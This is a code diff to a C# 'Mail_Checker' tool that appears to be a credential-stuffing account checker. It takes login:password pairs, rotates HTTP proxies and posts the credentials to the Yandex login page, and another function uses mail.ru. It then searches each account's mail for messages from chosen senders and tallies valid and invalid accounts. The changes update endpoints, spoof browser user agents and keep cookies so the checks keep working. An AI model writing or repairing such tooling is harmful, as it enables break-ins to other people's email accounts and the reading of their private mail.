@@ -188,7 +188,7 @@ namespace Mail_Checker
 
                 MailInfo mInfo = new MailInfo(mailElements[0], mailElements[1], messages);
                 CheckState chState = new CheckState(mails.Count + workingThreads - 1, proxys.Count + workingThreads - 1, errors, valid, novalid, workingThreads);
-                OneCheckDone(this, new CheckEventArgs(error, mInfo, chState));
+                if (started) OneCheckDone(this, new CheckEventArgs(error, mInfo, chState));
 
 
 
@@ -263,11 +263,12 @@ namespace Mail_Checker
 
 
                 HttpProxyClient proxy = new HttpProxyClient(proxyElements[0], Convert.ToInt32(proxyElements[1]));
+                CookieDictionary cookies = new CookieDictionary();
+
 
                 req1 = new xNet.Net.HttpRequest();
                 req1.Proxy = proxy;
-                req1.Cookies = new CookieDictionary();
-                req1.KeepAlive = true;
+                req1.Cookies = cookies;
                 req1.ConnectTimeout = timeout * 1000;
                 req1.UserAgent = "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10";
 
@@ -294,7 +295,8 @@ namespace Mail_Checker
 
                 for (int i = 0; i < querys.Length; i++)
                 {
-
+                    req1.UserAgent = "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10";
+                    req1.Cookies = cookies;
                     res1 = req1.Get("https://m.mail.ru/search/gosearch?q_from=" + querys[i]);
 
                     res1str = res1.ToString();
@@ -326,14 +328,11 @@ namespace Mail_Checker
                 }
 
             }
-            catch (HttpException)
+            catch 
             {
                 error = CheckErrors.proxyError;
             }
-            catch (ArgumentException)
-            {
-                error = CheckErrors.proxyError;
-            }
+
 
 
             if (req1!=null) req1.Dispose();
@@ -355,22 +354,24 @@ namespace Mail_Checker
 
             xNet.Net.HttpRequest req1=null;
 
+
             try
             {
 
 
                 HttpProxyClient proxy = new HttpProxyClient(proxyElements[0], Convert.ToInt32(proxyElements[1]));
+                CookieDictionary cookies = new CookieDictionary();
 
                 req1 = new xNet.Net.HttpRequest();
                 req1.Proxy = proxy;
-                req1.Cookies = new CookieDictionary();
-                req1.KeepAlive = true;
+                req1.Cookies = cookies;
                 req1.ConnectTimeout = timeout * 1000;
                 req1.AddParam("login", mailElements[0]);
                 req1.AddParam("passwd", mailElements[1]);
                 req1.AddParam("retpath", "https://mail.yandex.ru");
+                req1.UserAgent = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36";
 
-                xNet.Net.HttpResponse res1 = req1.Post("https://passport.yandex.ru/passport?mode=auth&from=passport&retpath=https://mail.yandex.ru&_locale=ru&_ckey=");
+                xNet.Net.HttpResponse res1 = req1.Post("https://passport.yandex.ru/passport?mode=auth&from=mail&origin=hostroot_new_l_enter&retpath=https://mail.yandex.ru");
 
                 string res1str = res1.ToString();
             
@@ -389,12 +390,22 @@ namespace Mail_Checker
                     return;
                 }
 
-                req1.Get("https://mail.yandex.ru/neo2/handlers/handlers3.jsx?_h=folders&_handlers=folders&_locale=ru&_ckey=");
+                //req1.Get("https://mail.yandex.ru/neo2/handlers/handlers3.jsx?_h=folders&_handlers=folders");
 
                 for (int i = 0; i < querys.Length; i++)
                 {
+                    req1.UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko";
+                    req1.Cookies = cookies;
+                    req1.AddParam("_handlers", "messages");
+                    req1.AddParam("search", "yes");
+                    req1.AddParam("scope", "hdr_from");
+                    req1.AddParam("request", querys[i]);
+                    req1.AddParam("_page", "messages");
+                    req1.AddParam("_service", "mail");
+                    req1.AddParam("_locale", "ru");
+                    req1.AddHeader("X-Requested-With", "XMLHttpRequest");
 
-                    res1 = req1.Get("https://mail.yandex.ru/neo2/handlers/handlers3.jsx?_h=messages&_handlers=messages&search=yes&_locale=ru&_ckey=&request=" + querys[i]);
+                    res1 = req1.Post("https://mail.yandex.ru/neo2/handlers/handlers3.jsx?_h=messages");
 
                     res1str = res1.ToString();
 
@@ -402,10 +413,6 @@ namespace Mail_Checker
                     {
                         error = CheckErrors.proxyError;
                         return;
-                    }
-                    else if (res1str == "")
-                    {
-                        throw new NotImplementedException();
                     }
                     else
                     {
@@ -416,15 +423,10 @@ namespace Mail_Checker
                 }
 
             }
-            catch (HttpException)
+            catch
             {
                 error = CheckErrors.proxyError;
             }
-            catch (ArgumentException)
-            {
-                error = CheckErrors.proxyError;
-            }
-
 
             if (req1 != null) req1.Dispose();
 
@@ -506,19 +508,11 @@ namespace Mail_Checker
 
                 }
             }
-            catch (xNet.Net.ProxyException e)
-            {
-
-                error = CheckErrors.proxyError;
-            }
-            catch (IOException e)
+            catch 
             {
                 error = CheckErrors.proxyError;
             }
-            catch (NullReferenceException e)
-            {
-                error = CheckErrors.proxyError;
-            }
+            
 
 
             imap.Dispose();
